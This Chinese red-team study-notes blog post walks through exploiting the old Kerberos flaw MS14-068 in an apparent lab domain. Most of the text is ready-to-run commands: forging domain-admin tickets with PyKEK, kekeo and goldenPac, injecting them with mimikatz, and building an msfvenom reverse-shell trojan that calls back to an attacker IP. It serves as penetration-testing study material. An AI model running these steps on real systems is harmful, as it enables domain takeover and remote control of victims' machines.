---
title: 【内网学习笔记】27、Kerberos 域用户提权漏洞
date: 2021-09-24 10:05:20
id: 210924-100520
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231733653.png
tags:
- 红队
- 学习笔记
- 内网
categories:
- 内网学习笔记
---

## 0、前言

在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-6324，该漏洞影响了 Windows Server 2012 R2 以下的服务器，该漏洞允许 RT 将任意用户权限提升至域管级别。

不过从漏洞年代就知道这已经是个远古时代的漏洞，现实中已经很少会碰到了，这里就简单记录下，顺便熟悉熟悉工具的用法。

14-068 产生的原因主要在于用户可以利用伪造的票据向认证服务器发起请求，如果用户伪造域管的票据，服务端就会把拥有域管权限的服务票据返回回来。

## 1、PyKEK

PyKEK 是一个利用 Kerberos 协议进行渗透的工具包，下载地址：[https://github.com/mubix/pykek](https://github.com/mubix/pykek)

使用 PyKEK 可以生成一个高权限的服务票据，之后通过 mimikatz 将服务票据导入到内存中。

MS 14-068 的补丁为：KB3011780，通过 wmic 查看补丁情况

```
wmic qfe get hotfixid | findstr KB3011780
```

查看当前用户 SID

```
whoami /user
```

或者使用 wmic 

```
wmic useraccount get name,sid
```

生成高权限票据，-d 指定域控地址

```
python2 ms14-068.py -u jack@0day.org -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142 -p Aa123456
```

打开 mimikatz 清除当前内存中的票据信息

```
kerberos::purge
```

将高权限票据注入内存

```
kerberos::ptc "TGT_jack@0day.org.ccache"
```

使用 net use 连接域控后，使用 psexec 获取 Shell

> 这里 net ues 使用 IP 可能会失败，因此在此使用机器名进行连接 

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231733653.png)

## 2、GoldenPac

goldenPac.py 是一个用于对 Kerberos 协议进行测试的工具，它集成在 impacket 工具包里。

Kali 在使用之前需要先安装 Kerberos 客户端

```
apt-get install krb5-user -y
```

利用 goldenPac.py 获取 Shell

```
python3 goldenPac.py 0day.org/jack:Aa123456@OWA2010SP3.0day.org
```

> 这里使用 IP 进行连接会连接不成功，只能使用主机名，因此可以在 hosts 文件中添加主机名对应的 IP

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231746641.png)

goldenPac.py 是通过 PsExec 获得 Shell 的，因此会产生大量的日志，而且现在这种连接方式也已经被各大杀软所拦截。

## 3、kekeo

kekeo 也是一个工具集，其中包含了 ms14-068 的利用模块，kekeo 下载地址：[https://github.com/gentilkiwi/kekeo](https://github.com/gentilkiwi/kekeo)

使用之前需要先清除票据

```
klist purge
```

然后直接使用 kekeo 生成高权限票据

```
kekeo.exe "exploit::ms14068 /domain:0day.org /user:jack /password:Aa123456 /ptt" "exit"
```

之后就可以直接 dir 域控或者 PsExec 连接到域控了

## 4、MSF

MSF 中也有 MS 14-086 的提权 EXP，不过需要结合 mimikatz 进行利用

```
use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
set domain 0day.org
set password Aa123456
set user jack
set user_sid  S-1-5-21-1812960810-2335050734-3517558805-1133
set rhosts OWA2010SP3.0day.org
run
```

设置好域名、域控 IP、密码、用户、SID 后运行，将会获取一个 bin 文件

由于 MSF 里不支持 bin 文件的导入，因此需要 mimikatz 对其进行格式转换

```
kerberos::clist "20210923061821_default_192.168.3.142_windows.kerberos_484249.bin" /export
```

之后，生成一个木马

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.214.74 lport=4444 -f exe > shell.exe
```

将木马复制到目标主机上，并使其上线到 MSF

获得会话后，将刚才 mimikatz 转换后的 kirbi 文件导入到会话中

```
load kiwi
kerberos_ticket_use /tmp/0-00000000-jack@krbtgt-0DAY.ORG.kirbi
background
```

之后使用 current_user_psexec 模块

```
use exploit/windows/local/current_user_psexec
set session 2
set rhosts OWA2010SP3.0day.org
set payload windows/meterpreter/reverse_tcp
set lhost 172.16.214.74
run
```

然后就会返回高权限的会话

> 不过 MSF 在使用过程中报错了，网上一查发现别人也有这个错误，暂时还不清楚解决的方法

## 5、CS

先利用前面的 ms14-068.py 生成一个 ccache 文件，之后使用 KrbCredExport 将 ccache 文件转为 kirbi 格式

KrbCredExport 下载地址：[https://github.com/rvazarkar/KrbCredExport](https://github.com/rvazarkar/KrbCredExport)

```
python2 KrbCredExport.py TGT_jack@0day.org.ccache user.ticket
```

接着使用 CS 的 kerberos_ticket_use 加载 ticket，之后就能访问到域控了

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109240943968.png)

此时想让域控上线自然也是没问题的了，可以先添加一个域控地址的 target，然后选择 PsExec ，勾选上 use session's current access token 通过 jack 的会话上线即可。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109241000974.png)

> 参考文章：
>
> [https://www.jianshu.com/p/27730ab4a6db](https://www.jianshu.com/p/27730ab4a6db)
>
> [https://www.cnblogs.com/websecyw/p/11835830.html](https://www.cnblogs.com/websecyw/p/11835830.html)
>
> 更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)



